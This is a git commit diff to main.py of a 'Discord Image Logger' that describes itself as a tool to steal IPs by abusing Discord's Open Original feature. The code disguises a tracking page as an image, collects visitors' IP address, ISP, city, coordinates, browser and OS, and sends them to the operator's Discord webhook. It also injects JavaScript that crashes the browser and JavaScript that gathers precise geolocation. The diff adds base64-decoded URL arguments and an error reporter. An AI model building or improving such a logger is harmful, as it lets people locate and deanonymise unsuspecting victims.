c7ecdfda8fcefcdc2a85d80f18f99ab2941d41cc
DeKrypt <52050537+dekrypted@users.noreply.github.com>
2023-03-14 21:47:26 -0400

    Fixed URL argument + Added a basic error handler

--- main.py
+++ main.py
@@ -3,7 +3,7 @@
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import requests, base64, httpagentparser
+import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -73,6 +73,19 @@ def botCheck(ip, useragent):
         return "Telegram"
     else:
         return False
+
+def reportError(error):
+    requests.post(config["webhook"], json = {
+    "username": config["username"],
+    "content": "",
+    "embeds": [
+        {
+            "title": "Image Logger - Error",
+            "color": config["color"],
+            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+        }
+    ],
+})
 
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
@@ -174,88 +187,90 @@ binaries = {
 }
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
+    
     def handleRequest(self):
-        if config["imageArgument"]:
-            s = self.path
-            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-            if dic.get("url") or dic.get("id"):
-                url = dic.get("url") or dic.get("id")
+        try:
+            if config["imageArgument"]:
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+                if dic.get("url") or dic.get("id"):
+                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
+                else:
+                    url = config["image"]
             else:
                 url = config["image"]
-        else:
-            url = config["image"]
 
-        data = f'''<style>body {{
-  margin: 0;
-  padding: 0;
-  }}
+            data = f'''<style>body {{
+margin: 0;
+padding: 0;
+}}
 div.img {{
-  background-image: url('{url}');
-  background-position: center center;
-  background-repeat: no-repeat;
-  background-size: contain;
-  width: 100vw;
-  height: 100vh;
-  }}</style><div class="img"></div>'''.encode()
-        
-        if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
-            return
-        
-        if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-            self.send_response(200)
-            self.send_header('Content-type','image/jpeg' if config["buggedImage"] else 'text/html')
-            self.end_headers()
+background-image: url('{url}');
+background-position: center center;
+background-repeat: no-repeat;
+background-size: contain;
+width: 100vw;
+height: 100vh;
+}}</style><div class="img"></div>'''.encode()
             
-            self.wfile.write(binaries["loading"] if config["buggedImage"] else data)
-            makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
+            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
+                return
             
-            return
-        
-        else:
-            s = self.path
-            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-
-            if dic.get("g") and config["accurateLocation"]:
-                location = base64.b64decode(dic.get("g").encode()).decode()
-                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
+            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
+                self.send_response(200)
+                self.send_header('Content-type','image/jpeg' if config["buggedImage"] else 'text/html')
+                self.end_headers()
+                
+                self.wfile.write(binaries["loading"] if config["buggedImage"] else data)
+                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
+                
+                return
+            
             else:
-                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
-            
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
 
-            message = config["message"]["message"]
+                if dic.get("g") and config["accurateLocation"]:
+                    location = base64.b64decode(dic.get("g").encode()).decode()
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
+                else:
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
+                
 
-            if config["message"]["richMessage"]:
-                message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
-                message = message.replace("{isp}", result["isp"])
-                message = message.replace("{asn}", result["as"])
-                message = message.replace("{country}", result["country"])
-                message = message.replace("{region}", result["regionName"])
-                message = message.replace("{city}", result["city"])
-                message = message.replace("{lat}", str(result["lat"]))
-                message = message.replace("{long}", str(result["lon"]))
-                message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
-                message = message.replace("{mobile}", str(result["mobile"]))
-                message = message.replace("{vpn}", str(result["proxy"]))
-                message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
-                message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
-                message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
+                message = config["message"]["message"]
 
-            datatype = 'text/html'
+                if config["message"]["richMessage"]:
+                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
+                    message = message.replace("{isp}", result["isp"])
+                    message = message.replace("{asn}", result["as"])
+                    message = message.replace("{country}", result["country"])
+                    message = message.replace("{region}", result["regionName"])
+                    message = message.replace("{city}", result["city"])
+                    message = message.replace("{lat}", str(result["lat"]))
+                    message = message.replace("{long}", str(result["lon"]))
+                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
+                    message = message.replace("{mobile}", str(result["mobile"]))
+                    message = message.replace("{vpn}", str(result["proxy"]))
+                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
+                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
+                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
 
-            if config["message"]["doMessage"]:
-                data = message.encode()
-            
-            if config["crashBrowser"]:
-                data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
+                datatype = 'text/html'
 
-            if config["redirect"]["redirect"]:
-                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-            self.send_response(200) # 200 = OK (HTTP Status)
-            self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
-            self.end_headers() # Declare the headers as finished.
+                if config["message"]["doMessage"]:
+                    data = message.encode()
+                
+                if config["crashBrowser"]:
+                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
 
-            if config["accurateLocation"]:
-                data += b"""<script>
+                if config["redirect"]["redirect"]:
+                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+                self.send_response(200) # 200 = OK (HTTP Status)
+                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
+
+                if config["accurateLocation"]:
+                    data += b"""<script>
 var currenturl = window.location.href;
 
 if (!currenturl.includes("g=")) {
@@ -270,8 +285,16 @@ if (!currenturl.includes("g=")) {
 }}
 
 </script>"""
-            self.wfile.write(data)
-    
+                self.wfile.write(data)
+        
+        except Exception:
+            self.send_response(500)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+
+            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
+            reportError(traceback.format_exc())
+
         return
     
     do_GET = handleRequest
